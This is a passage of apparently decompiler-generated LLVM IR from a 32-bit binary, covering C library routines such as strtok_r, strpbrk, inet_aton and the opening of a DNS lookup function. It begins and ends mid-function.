  br i1 %v15_80527dc, label %dec_label_pc_80527e8, label %dec_label_pc_80527e0

dec_label_pc_80527e0:                             ; preds = %dec_label_pc_80527d7, %dec_label_pc_80527d3
  %v5_80527d8 = phi i32 [ %v7_80527d8, %dec_label_pc_80527d7 ], [ %v5_80527d826.lcssa, %dec_label_pc_80527d3 ]
  %v0_80527d7 = phi i32 [ %v1_80527d7, %dec_label_pc_80527d7 ], [ %v0_8052782.lcssa, %dec_label_pc_80527d3 ]
  %v0_80527e0 = phi i32 [ %v1_80527e0, %dec_label_pc_80527d7 ], [ %v0_80527cb.lcssa, %dec_label_pc_80527d3 ]
  %v10_80527e1 = icmp eq i32 %v0_80527e0, 0
  %v1_80527e4 = icmp eq i1 %v10_80527e1, false
  br i1 %v1_80527e4, label %dec_label_pc_80527d7, label %dec_label_pc_80527e6

dec_label_pc_80527e6:                             ; preds = %dec_label_pc_80527e0
  br label %dec_label_pc_80527e8

dec_label_pc_80527e8:                             ; preds = %dec_label_pc_8052755, %dec_label_pc_80527b3, %dec_label_pc_80527a7, %dec_label_pc_805279b, %dec_label_pc_80527d7, %dec_label_pc_80527c7, %dec_label_pc_80527e6
  %v0_80527eb = phi i32 [ %v1_8052782, %dec_label_pc_80527c7 ], [ 0, %dec_label_pc_80527e6 ], [ %v1_80527d7, %dec_label_pc_80527d7 ], [ %v1_80527b7, %dec_label_pc_80527b3 ], [ %v1_80527ab, %dec_label_pc_80527a7 ], [ %v1_805279f, %dec_label_pc_805279b ], [ %v1_8052755, %dec_label_pc_8052755 ]
  ret i32 %v0_80527eb

; uselistorder directives
  uselistorder i32 %v0_80527e0, { 1, 0 }
  uselistorder i32 %v1_80527cb, { 0, 2, 1 }
  uselistorder i32 %v1_8052782, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_805278251, { 3, 2, 1, 0 }
  uselistorder i32 %v2_8052777, { 1, 0 }
  uselistorder i32 %v0_8052755, { 1, 0, 2 }
  uselistorder i32 %v2_8052751, { 1, 0 }
  uselistorder i32 %v4_8052741, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 -2, { 2, 7, 0, 16, 17, 1, 15, 19, 14, 20, 3, 5, 4, 21, 8, 9, 10, 18, 11, 12, 6, 13 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80527e8, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8052782, { 1, 0 }
  uselistorder label %dec_label_pc_805276b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052767, { 1, 0 }
}

define i32 @strtok_r(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80527ec = load i32, i32* @edi, align 4
  %v0_80527ed = load i32, i32* @esi, align 4
  %v0_80527ee = load i32, i32* @ebx, align 4
  store i32 %v0_80527ee, i32* %stack_var_-12, align 4
  %v4_80527ef = ptrtoint i8* %arg1 to i32
  store i32 %v4_80527ef, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_80527fb = icmp eq i8* %arg1, null
  %v1_80527fd = icmp eq i1 %v1_80527fb, false
  br i1 %v1_80527fd, label %dec_label_pc_8052801, label %dec_label_pc_80527ff

dec_label_pc_80527ff:                             ; preds = %entry
  %v1_80527ff = inttoptr i32 %arg3 to i32*
  %v2_80527ff = load i32, i32* %v1_80527ff, align 4
  store i32 %v2_80527ff, i32* @ebx, align 4
  br label %dec_label_pc_8052801

dec_label_pc_8052801:                             ; preds = %entry, %dec_label_pc_80527ff
  %v0_8052804 = phi i32 [ %v4_80527ef, %entry ], [ %v2_80527ff, %dec_label_pc_80527ff ]
  %v0_8052801 = load i32, i32* @ecx, align 4
  %v5_8052804 = inttoptr i32 %v0_8052804 to i8*
  %v8_8052805 = call i32 @__GI_strspn(i8* %v5_8052804, i32 %arg2, i32 %v0_8052801, i32 %v0_8052801)
  store i32 %v8_8052805, i32* %eax.global-to-local, align 4
  %v0_805280d = load i32, i32* @ebx, align 4
  %v2_805280d = add i32 %v0_805280d, %v8_8052805
  store i32 %v2_805280d, i32* @ebx, align 4
  %v1_805280f = inttoptr i32 %v2_805280d to i8*
  %v2_805280f = load i8, i8* %v1_805280f, align 1
  %v3_805280f = icmp eq i8 %v2_805280f, 0
  %v1_8052812 = icmp eq i1 %v3_805280f, false
  br i1 %v1_8052812, label %dec_label_pc_805281a, label %dec_label_pc_8052814

dec_label_pc_8052814:                             ; preds = %dec_label_pc_8052801
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8052816 = load i32, i32* @esi, align 4
  %v2_8052816 = inttoptr i32 %v1_8052816 to i32*
  store i32 %v2_805280d, i32* %v2_8052816, align 4
  %v0_8052844.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052841

dec_label_pc_805281a:                             ; preds = %dec_label_pc_8052801
  %v0_805281a = load i32, i32* @edx, align 4
  %v0_805281c = load i32, i32* @edi, align 4
  %v8_805281e = call i32 @__GI_strpbrk(i8* %v1_805280f, i32 %v0_805281c, i32 %v0_805281a, i32 %v0_805281a)
  store i32 %v8_805281e, i32* %eax.global-to-local, align 4
  %v2_8052826 = icmp eq i32 %v8_805281e, 0
  %v1_8052828 = icmp eq i1 %v2_8052826, false
  br i1 %v1_8052828, label %dec_label_pc_8052839, label %dec_label_pc_805282a

dec_label_pc_805282a:                             ; preds = %dec_label_pc_805281a
  %v0_805282e = load i32, i32* @ebx, align 4
  %v5_805282e = inttoptr i32 %v0_805282e to i8*
  %v8_805282f = call i32 @rawmemchr(i8* %v5_805282e, i32 0, i32 %v8_805281e, i32 %v8_805281e)
  br label %dec_label_pc_805283d

dec_label_pc_8052839:                             ; preds = %dec_label_pc_805281a
  %v9_805281e = inttoptr i32 %v8_805281e to i8*
  store i8 0, i8* %v9_805281e, align 1
  %v2_805283c = add i32 %v8_805281e, 1
  br label %dec_label_pc_805283d

dec_label_pc_805283d:                             ; preds = %dec_label_pc_805282a, %dec_label_pc_8052839
  %storemerge = phi i32 [ %v2_805283c, %dec_label_pc_8052839 ], [ %v8_805282f, %dec_label_pc_805282a ]
  %v0_805283d = phi i32 [ %v2_805283c, %dec_label_pc_8052839 ], [ %v8_805282f, %dec_label_pc_805282a ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_805283d = load i32, i32* @esi, align 4
  %v2_805283d = inttoptr i32 %v1_805283d to i32*
  store i32 %v0_805283d, i32* %v2_805283d, align 4
  %v0_805283f = load i32, i32* @ebx, align 4
  store i32 %v0_805283f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052841

dec_label_pc_8052841:                             ; preds = %dec_label_pc_8052814, %dec_label_pc_805283d
  %v0_8052844 = phi i32 [ %v0_8052844.pre, %dec_label_pc_8052814 ], [ %v0_805283f, %dec_label_pc_805283d ]
  %v2_8052841 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052841, i32* @ebx, align 4
  store i32 %v0_80527ed, i32* @esi, align 4
  store i32 %v0_80527ec, i32* @edi, align 4
  ret i32 %v0_8052844

; uselistorder directives
  uselistorder i32 %v8_805281e, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052841, { 1, 0 }
  uselistorder label %dec_label_pc_805283d, { 1, 0 }
  uselistorder label %dec_label_pc_8052801, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8052849 = load i32, i32* @ebx, align 4
  %v2_805286024 = load i8, i8* %arg1, align 1
  %v4_805286228 = icmp eq i8 %v2_805286024, 0
  br i1 %v4_805286228, label %dec_label_pc_805286a, label %dec_label_pc_8052866.lr.ph

dec_label_pc_8052866.lr.ph:                       ; preds = %entry
  %v3_805286025 = zext i8 %v2_805286024 to i32
  %v5_805286026 = and i32 %v0_8052849, -256
  %v6_805286027 = or i32 %v3_805286025, %v5_805286026
  %v4_805284e = ptrtoint i8* %arg1 to i32
  %v1_805285913 = inttoptr i32 %arg2 to i8*
  %v4_8052859.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8052866

dec_label_pc_8052854:                             ; preds = %dec_label_pc_8052866, %dec_label_pc_8052858
  %v6_805285922 = phi i32 [ %v6_8052859, %dec_label_pc_8052858 ], [ %v6_805285917, %dec_label_pc_8052866 ]
  %v2_805285921 = phi i8 [ %v2_8052859, %dec_label_pc_8052858 ], [ %v2_805285914, %dec_label_pc_8052866 ]
  %v0_805285820 = phi i32 [ %v1_8052858, %dec_label_pc_8052858 ], [ %arg2, %dec_label_pc_8052866 ]
  %v15_8052854 = icmp eq i8 %v2_805285921, %v2_805286031
  br i1 %v15_8052854, label %dec_label_pc_805286c, label %dec_label_pc_8052858

dec_label_pc_8052858:                             ; preds = %dec_label_pc_8052854
  %v1_8052858 = add i32 %v0_805285820, 1
  store i32 %v1_8052858, i32* @edx, align 4
  %v1_8052859 = inttoptr i32 %v1_8052858 to i8*
  %v2_8052859 = load i8, i8* %v1_8052859, align 1
  %v3_8052859 = zext i8 %v2_8052859 to i32
  %v5_8052859 = and i32 %v6_805285922, -256
  %v6_8052859 = or i32 %v3_8052859, %v5_8052859
  store i32 %v6_8052859, i32* @ecx, align 4
  %v4_805285b = icmp eq i8 %v2_8052859, 0
  %v1_805285d = icmp eq i1 %v4_805285b, false
  br i1 %v1_805285d, label %dec_label_pc_8052854, label %dec_label_pc_805285f

dec_label_pc_805285f:                             ; preds = %dec_label_pc_8052858, %dec_label_pc_8052866
  %v4_8052859.pre34 = phi i32 [ %v6_805285917, %dec_label_pc_8052866 ], [ %v6_8052859, %dec_label_pc_8052858 ]
  %v1_805285f = add i32 %v0_805285f29, 1
  %v1_8052860 = inttoptr i32 %v1_805285f to i8*
  %v2_8052860 = load i8, i8* %v1_8052860, align 1
  %v3_8052860 = zext i8 %v2_8052860 to i32
  %v5_8052860 = and i32 %v6_805286032, -256
  %v6_8052860 = or i32 %v3_8052860, %v5_8052860
  %v4_8052862 = icmp eq i8 %v2_8052860, 0
  br i1 %v4_8052862, label %dec_label_pc_805286a, label %dec_label_pc_8052866

dec_label_pc_8052866:                             ; preds = %dec_label_pc_8052866.lr.ph, %dec_label_pc_805285f
  %v4_8052859.pre = phi i32 [ %v4_8052859.pre.pre, %dec_label_pc_8052866.lr.ph ], [ %v4_8052859.pre34, %dec_label_pc_805285f ]
  %v6_805286032 = phi i32 [ %v6_805286027, %dec_label_pc_8052866.lr.ph ], [ %v6_8052860, %dec_label_pc_805285f ]
  %v2_805286031 = phi i8 [ %v2_805286024, %dec_label_pc_8052866.lr.ph ], [ %v2_8052860, %dec_label_pc_805285f ]
  %v0_805285f29 = phi i32 [ %v4_805284e, %dec_label_pc_8052866.lr.ph ], [ %v1_805285f, %dec_label_pc_805285f ]
  store i32 %arg2, i32* @edx, align 4
  %v2_805285914 = load i8, i8* %v1_805285913, align 1
  %v3_805285915 = zext i8 %v2_805285914 to i32
  %v5_805285916 = and i32 %v4_8052859.pre, -256
  %v6_805285917 = or i32 %v3_805285915, %v5_805285916
  store i32 %v6_805285917, i32* @ecx, align 4
  %v4_805285b18 = icmp eq i8 %v2_805285914, 0
  %v1_805285d19 = icmp eq i1 %v4_805285b18, false
  br i1 %v1_805285d19, label %dec_label_pc_8052854, label %dec_label_pc_805285f

dec_label_pc_805286a:                             ; preds = %dec_label_pc_805285f, %entry
  br label %dec_label_pc_805286c

dec_label_pc_805286c:                             ; preds = %dec_label_pc_8052854, %dec_label_pc_805286a
  %v0_805286e = phi i32 [ 0, %dec_label_pc_805286a ], [ %v0_805285f29, %dec_label_pc_8052854 ]
  store i32 %v0_8052849, i32* @ebx, align 4
  ret i32 %v0_805286e

; uselistorder directives
  uselistorder i32 %v6_805285917, { 2, 0, 1 }
  uselistorder i8 %v2_805285914, { 1, 2, 0 }
  uselistorder i32 %v1_805285f, { 1, 0 }
  uselistorder i32 %v6_8052859, { 1, 2, 0 }
  uselistorder i8 %v2_8052859, { 1, 2, 0 }
  uselistorder i32 %v1_8052858, { 2, 1, 0 }
  uselistorder i8 %v2_805286024, { 0, 2, 1 }
  uselistorder i32 %v0_8052849, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805286c, { 1, 0 }
  uselistorder label %dec_label_pc_8052866, { 1, 0 }
  uselistorder label %dec_label_pc_805285f, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8052877 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052877, i32* @ecx, align 4
  %v1_805287b = icmp eq i8* %arg1, null
  br i1 %v1_805287b, label %dec_label_pc_80528fc, label %dec_label_pc_805287f

dec_label_pc_805287f:                             ; preds = %entry
  %v0_805288d.pre = load i32, i32* @global_var_8059858, align 8
  br label %dec_label_pc_805288a

dec_label_pc_805288a:                             ; preds = %dec_label_pc_805287f, %dec_label_pc_80528d3
  %v2_80528d635 = phi i32 [ 1, %dec_label_pc_805287f ], [ %v3_80528d6, %dec_label_pc_80528d3 ]
  %v0_805288a34 = phi i32 [ %v4_8052877, %dec_label_pc_805287f ], [ %v0_805288a3, %dec_label_pc_80528d3 ]
  %v0_80528f133 = phi i32 [ 0, %dec_label_pc_805287f ], [ %v2_80528d9, %dec_label_pc_80528d3 ]
  %v1_805288a = inttoptr i32 %v0_805288a34 to i8*
  %v2_805288a = load i8, i8* %v1_805288a, align 1
  %v3_805288a = sext i8 %v2_805288a to i32
  %v2_8052893 = mul nsw i32 %v3_805288a, 2
  %v3_8052893 = add i32 %v2_8052893, %v0_805288d.pre
  %v4_8052893 = inttoptr i32 %v3_8052893 to i8*
  %v5_8052893 = load i8, i8* %v4_8052893, align 1
  %v6_8052893 = and i8 %v5_8052893, 8
  %v7_8052893 = icmp eq i8 %v6_8052893, 0
  br i1 %v7_8052893, label %dec_label_pc_80528fc, label %dec_label_pc_805289a

dec_label_pc_805289a:                             ; preds = %dec_label_pc_805288a
  %v4_80528ae.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80528ae

dec_label_pc_805289e:                             ; preds = %dec_label_pc_80528ae
  %v3_805289e = mul i32 %v1_805289e, 10
  %v2_80528a1 = add i32 %v3_805289e, -48
  %v3_80528a1 = add i32 %v2_80528a1, %v2_80528b0
  %v1_80528a5 = add i32 %v3_80528a1, -255
  %v6_80528a5 = sub i32 254, %v3_80528a1
  %v7_80528a5 = and i32 %v6_80528a5, %v3_80528a1
  %v8_80528a5 = icmp slt i32 %v7_80528a5, 0
  %v9_80528a5 = icmp eq i32 %v1_80528a5, 0
  %v10_80528a5 = icmp slt i32 %v1_80528a5, 0
  %v3_80528ab = icmp eq i1 %v10_80528a5, %v8_80528a5
  %v4_80528ab = icmp eq i1 %v9_80528a5, false
  %v5_80528ab = and i1 %v4_80528ab, %v3_80528ab
  br i1 %v5_80528ab, label %dec_label_pc_80528fc, label %dec_label_pc_80528ad

dec_label_pc_80528ad:                             ; preds = %dec_label_pc_805289e
  %v1_80528ad = add i32 %v0_80528ad, 1
  store i32 %v1_80528ad, i32* @ecx, align 4
  br label %dec_label_pc_80528ae

dec_label_pc_80528ae:                             ; preds = %dec_label_pc_805289a, %dec_label_pc_80528ad
  %v1_805289e = phi i32 [ 0, %dec_label_pc_805289a ], [ %v3_80528a1, %dec_label_pc_80528ad ]
  %v4_80528ae = phi i32 [ %v4_80528ae.pre, %dec_label_pc_805289a ], [ %v6_80528ae, %dec_label_pc_80528ad ]
  %v0_80528ad = phi i32 [ %v0_805288a34, %dec_label_pc_805289a ], [ %v1_80528ad, %dec_label_pc_80528ad ]
  %v1_80528ae = inttoptr i32 %v0_80528ad to i8*
  %v2_80528ae = load i8, i8* %v1_80528ae, align 1
  %v3_80528ae = zext i8 %v2_80528ae to i32
  %v5_80528ae = and i32 %v4_80528ae, -256
  %v6_80528ae = or i32 %v3_80528ae, %v5_80528ae
  store i32 %v6_80528ae, i32* @edx, align 4
  %v2_80528b0 = sext i8 %v2_80528ae to i32
  %v2_80528b3 = mul nsw i32 %v2_80528b0, 2
  %v3_80528b3 = add i32 %v2_80528b3, %v0_805288d.pre
  %v4_80528b3 = inttoptr i32 %v3_80528b3 to i16*
  %v5_80528b3 = load i16, i16* %v4_80528b3, align 2
  %v2_80528b8 = and i16 %v5_80528b3, 8
  %v3_80528b8 = icmp eq i16 %v2_80528b8, 0
  %v1_80528ba = icmp eq i1 %v3_80528b8, false
  br i1 %v1_80528ba, label %dec_label_pc_805289e, label %dec_label_pc_80528bc

dec_label_pc_80528bc:                             ; preds = %dec_label_pc_80528ae
  %v8_80528bc = sub nsw i32 2, %v2_80528d635
  %v9_80528bc = and i32 %v8_80528bc, %v2_80528d635
  %v10_80528bc = icmp slt i32 %v9_80528bc, 0
  %v11_80528bc = icmp eq i32 %v2_80528d635, 3
  %v12_80528bc = icmp slt i32 %v2_80528d635, 3
  %v3_80528c0 = icmp eq i1 %v12_80528bc, %v10_80528bc
  %v4_80528c0 = icmp eq i1 %v11_80528bc, false
  %v5_80528c0 = and i1 %v4_80528c0, %v3_80528c0
  br i1 %v5_80528c0, label %dec_label_pc_80528ca, label %dec_label_pc_80528c2

dec_label_pc_80528c2:                             ; preds = %dec_label_pc_80528bc
  %v10_80528c2 = icmp eq i8 %v2_80528ae, 46
  %v1_80528c5 = icmp eq i1 %v10_80528c2, false
  br i1 %v1_80528c5, label %dec_label_pc_80528fc, label %dec_label_pc_80528c7

dec_label_pc_80528c7:                             ; preds = %dec_label_pc_80528c2
  %v1_80528c7 = add i32 %v0_80528ad, 1
  store i32 %v1_80528c7, i32* @ecx, align 4
  br label %dec_label_pc_80528d3

dec_label_pc_80528ca:                             ; preds = %dec_label_pc_80528bc
  %v1_80528ca = add i32 %v0_80528ad, 1
  store i32 %v1_80528ca, i32* @ecx, align 4
  %v4_80528cb = icmp eq i8 %v2_80528ae, 0
  br i1 %v4_80528cb, label %dec_label_pc_80528d3, label %dec_label_pc_80528cf

dec_label_pc_80528cf:                             ; preds = %dec_label_pc_80528ca
  %v2_80528cf = and i16 %v5_80528b3, 32
  %v3_80528cf = icmp eq i16 %v2_80528cf, 0
  br i1 %v3_80528cf, label %dec_label_pc_80528fc, label %dec_label_pc_80528d3

dec_label_pc_80528d3:                             ; preds = %dec_label_pc_80528cf, %dec_label_pc_80528ca, %dec_label_pc_80528c7
  %v0_805288a3 = phi i32 [ %v1_80528ca, %dec_label_pc_80528cf ], [ %v1_80528ca, %dec_label_pc_80528ca ], [ %v1_80528c7, %dec_label_pc_80528c7 ]
  %v2_80528d3 = mul i32 %v0_80528f133, 256
  %v3_80528d6 = add nuw nsw i32 %v2_80528d635, 1
  %v2_80528d9 = or i32 %v1_805289e, %v2_80528d3
  %v7_80528df = icmp sgt i32 %v2_80528d635, 3
  br i1 %v7_80528df, label %dec_label_pc_80528e1, label %dec_label_pc_805288a

dec_label_pc_80528e1:                             ; preds = %dec_label_pc_80528d3
  %v4_80528e6 = icmp eq i32 %arg2, 0
  br i1 %v4_80528e6, label %dec_label_pc_80528fe, label %dec_label_pc_80528ed

dec_label_pc_80528ed:                             ; preds = %dec_label_pc_80528e1
  %v1_80528f1 = call i32 @llvm.bswap.i32(i32 %v2_80528d9)
  %v2_80528f3 = inttoptr i32 %arg2 to i32*
  store i32 %v1_80528f1, i32* %v2_80528f3, align 4
  br label %dec_label_pc_80528fe

dec_label_pc_80528fc:                             ; preds = %dec_label_pc_80528cf, %dec_label_pc_80528c2, %dec_label_pc_805288a, %dec_label_pc_805289e, %entry
  br label %dec_label_pc_80528fe

dec_label_pc_80528fe:                             ; preds = %dec_label_pc_80528e1, %dec_label_pc_80528ed, %dec_label_pc_80528fc
  %v0_8052903 = phi i32 [ 1, %dec_label_pc_80528e1 ], [ 1, %dec_label_pc_80528ed ], [ 0, %dec_label_pc_80528fc ]
  ret i32 %v0_8052903

; uselistorder directives
  uselistorder i32 %v2_80528b0, { 1, 0 }
  uselistorder i32 %v6_80528ae, { 1, 0 }
  uselistorder i8 %v2_80528ae, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80528ad, { 0, 1, 3, 2 }
  uselistorder i32 %v1_80528a5, { 1, 0 }
  uselistorder i32 %v3_80528a1, { 1, 0, 3, 2 }
  uselistorder i32 %v0_805288a34, { 1, 0 }
  uselistorder i32 %v2_80528d635, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 3, 2, 1, 0 }
  uselistorder i32 254, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80528fe, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80528fc, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_80528ae, { 1, 0 }
  uselistorder label %dec_label_pc_805288a, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp33 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-252 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  store i8* inttoptr (i32 512 to i8*), i8** %stack_var_-252, align 4
  %v2_805291a = call i32 @malloc(i32 512)
  store i32 %v2_805291a, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 1025 to i8*), i8** %stack_var_-252, align 4
  store i32 %v2_805291a, i32* @ebp, align 4
  %v2_8052928 = call i32 @malloc(i32 1025)
  store i32 %v2_8052928, i32* %eax.global-to-local, align 4
  %v12_8052931 = ptrtoint i32* %stack_var_-236 to i32
  %v1_8052934 = icmp eq i32 %v2_805291a, 0
  br i1 %v1_8052934, label %dec_label_pc_8052fad, label %dec_label_pc_805293c

dec_label_pc_805293c:                             ; preds = %entry
  %v1_805293c = icmp eq i32 %v2_8052928, 0
  br i1 %v1_805293c, label %dec_label_pc_8052fad, label %dec_label_pc_8052944

dec_label_pc_8052944:                             ; preds = %dec_label_pc_805293c
  %v5_8052944 = icmp eq i32 %arg2, 0
  br i1 %v5_8052944, label %dec_label_pc_8052fad, label %dec_label_pc_8052952

dec_label_pc_8052952:                             ; preds = %dec_label_pc_8052944
  %v4_8052952 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052952, i32* %eax.global-to-local, align 4
  %v2_8052959 = load i8, i8* %arg1, align 1
  %v3_8052959 = icmp eq i8 %v2_8052959, 0
  br i1 %v3_8052959, label %dec_label_pc_8052fad, label %dec_label_pc_8052962

dec_label_pc_8052962:                             ; preds = %dec_label_pc_8052952
  store i8* %arg1, i8** %stack_var_-252, align 4
  %v3_8052966 = call i32 @strlen(i8* nonnull %arg1)
  store i32 %v3_8052966, i32* @eax, align 4
  store i32 %v4_8052952, i32* %edx.global-to-local, align 4
  %v2_8052989 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_8052989, i32* @ebx, align 4
  %tmp46 = bitcast i32* %stack_var_-52 to i8*
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_8052991 = call i32 @__pthread_return_void(i32 %v2_8052989, i32 134550975)
  store i32 %v3_8052991, i32* %eax.global-to-local, align 4
  store i8* bitcast (i8** @global_var_805fd68.278 to i8*), i8** %stack_var_-252, align 4
  %v2_805299d = call i32 @__pthread_return_0(i32 ptrtoint (i8** @global_var_805fd68.278 to i32))
  %v0_80529a2 = load i64, i64* @global_var_805fd80.279, align 8
  %v1_80529a2 = trunc i64 %v0_80529a2 to i32
  %v1_80529a7 = ashr i32 %v1_80529a2, 31
  %v6_80529a8 = and i64 %v0_80529a2, 4294967295
  %v8_80529a8 = zext i32 %v1_80529a7 to i64
  %v9_80529a8 = mul nuw i64 %v8_80529a8, 4294967296
  %v10_80529a8 = or i64 %v9_80529a8, %v6_80529a8
  %v14_80529a8 = srem i64 %v10_80529a8, %tmp33
  %v15_80529a8 = trunc i64 %v14_80529a8 to i32
  %v0_80529af = load i16, i16* @global_var_8059ac4.280, align 4
  %v2_80529be = load i8*, i8** %stack_var_-252, align 4
  %v3_80529be = ptrtoint i8* %v2_80529be to i32
  store i32 %v3_80529be, i32* @eax, align 4
  store i32 134550975, i32* %edx.global-to-local, align 4
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_80529c3 = call i32 @__pthread_return_void(i32 %v2_8052989, i32 1)
  store i32 %v3_80529c3, i32* %eax.global-to-local, align 4
  %v3_8052a07 = sext i16 %v0_80529af to i32
  %v5_8052b6a = inttoptr i32 %v15_80529a8 to i8*
  %v1_8052f8887 = add i32 %v12_8052931, 28
  %v2_8052f8888 = inttoptr i32 %v1_8052f8887 to i32*
  %v3_8052f8889 = load i32, i32* %v2_8052f8888, align 4
  %tmp119 = icmp ult i32 %v3_8052f8889, 3
  br i1 %tmp119, label %dec_label_pc_80529e8, label %dec_label_pc_8052fad

dec_label_pc_80529e8:                             ; preds = %dec_label_pc_8052962, %dec_label_pc_8052f88.backedge
  %v0_80529ef92 = phi i32 [ %v0_8052f88.pre, %dec_label_pc_8052f88.backedge ], [ %v12_8052931, %dec_label_pc_8052962 ]
  %v1_80529e8 = add i32 %v0_80529ef92, 20
  %v2_80529e8 = inttoptr i32 %v1_80529e8 to i32*
  %v3_80529e8 = load i32, i32* %v2_80529e8, align 4
  %v13_80529e8 = icmp eq i32 %v3_80529e8, -1
  br i1 %v13_80529e8, label %dec_label_pc_80529e8.dec_label_pc_80529fe_crit_edge, label %dec_label_pc_80529ef

dec_label_pc_80529e8.dec_label_pc_80529fe_crit_edge: ; preds = %dec_label_pc_80529e8
  %v0_80529fe.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80529fe

dec_label_pc_80529ef:                             ; preds = %dec_label_pc_80529e8
  %v3_80529f2 = load i32, i32* %v2_80529e8, align 4
  %v5_80529f2 = add i32 %v0_80529ef92, -16
  %v6_80529f2 = inttoptr i32 %v5_80529f2 to i32*
  store i32 %v3_80529f2, i32* %v6_80529f2, align 4
  %v1_80529f6 = call i32 @__libc_close(i32 -1)
  store i32 %v1_80529f6, i32* %eax.global-to-local, align 4
  %v0_80529fb = load i32, i32* @esp, align 4
  %v1_80529fb = add i32 %v0_80529fb, 16
  br label %dec_label_pc_80529fe

dec_label_pc_80529fe:                             ; preds = %dec_label_pc_80529e8.dec_label_pc_80529fe_crit_edge, %dec_label_pc_80529ef
  %v1_80529fe = phi i32 [ %v0_80529ef92, %dec_label_pc_80529e8.dec_label_pc_80529fe_crit_edge ], [ %v1_80529fb, %dec_label_pc_80529ef ]
  %v0_80529fe = phi i32 [ %v0_80529fe.pre, %dec_label_pc_80529e8.dec_label_pc_80529fe_crit_edge ], [ %v1_80529f6, %dec_label_pc_80529ef ]
  %v2_80529fe = add i32 %v1_80529fe, -4
  %v3_80529fe = inttoptr i32 %v2_80529fe to i32*
  store i32 %v0_80529fe, i32* %v3_80529fe, align 4
  %v1_80529ff = add i32 %v1_80529fe, -8
  %v2_80529ff = inttoptr i32 %v1_80529ff to i32*
  store i32 512, i32* %v2_80529ff, align 4
  %v1_8052a04 = add i32 %v1_80529fe, -12
  %v2_8052a04 = inttoptr i32 %v1_8052a04 to i32*
  store i32 0, i32* %v2_8052a04, align 4
  %v2_8052a06 = add i32 %v1_80529fe, -16
  %v3_8052a06 = inttoptr i32 %v2_8052a06 to i32*
  store i32 %v2_805291a, i32* %v3_8052a06, align 4
  %v5_8052a07 = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_80529a8, i32 %v3_8052a07)
  store i32 %v5_8052a07, i32* %eax.global-to-local, align 4
  %v0_8052a0c = load i32, i32* @esp, align 4
  %v1_8052a0f = add i32 %v0_8052a0c, 8
  %v2_8052a0f = inttoptr i32 %v1_8052a0f to i32*
  store i32 48, i32* %v2_8052a0f, align 4
  %v1_8052a11 = add i32 %v0_8052a0c, 4
  %v2_8052a11 = inttoptr i32 %v1_8052a11 to i32*
  store i32 0, i32* %v2_8052a11, align 4
  %v1_8052a13 = add i32 %v0_8052a0c, 84
  store i32 %v1_8052a13, i32* @ebx, align 4
  %v3_8052a17 = inttoptr i32 %v0_8052a0c to i32*
  store i32 %v1_8052a13, i32* %v3_8052a17, align 4
  %v5_8052a18 = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_80529a8, i32 %v3_8052a07)
  store i32 %v5_8052a18, i32* %eax.global-to-local, align 4
  %v0_8052a1d = load i32, i32* @esp, align 4
  %v1_8052a1d = add i32 %v0_8052a1d, 60
  %v2_8052a1d = inttoptr i32 %v1_8052a1d to i32*
  %v3_8052a1d = load i32, i32* %v2_8052a1d, align 4
  store i32 %v3_8052a1d, i32* %eax.global-to-local, align 4
  %v1_8052a21 = add i32 %v0_8052a1d, 116
  %v2_8052a21 = inttoptr i32 %v1_8052a21 to i32*
  store i32 1, i32* %v2_8052a21, align 4
  %v0_8052a29 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052a29 = add i32 %v0_8052a29, 1
  %v0_8052a2a = load i32, i32* @esp, align 4
  %v1_8052a2a = add i32 %v0_8052a2a, 104
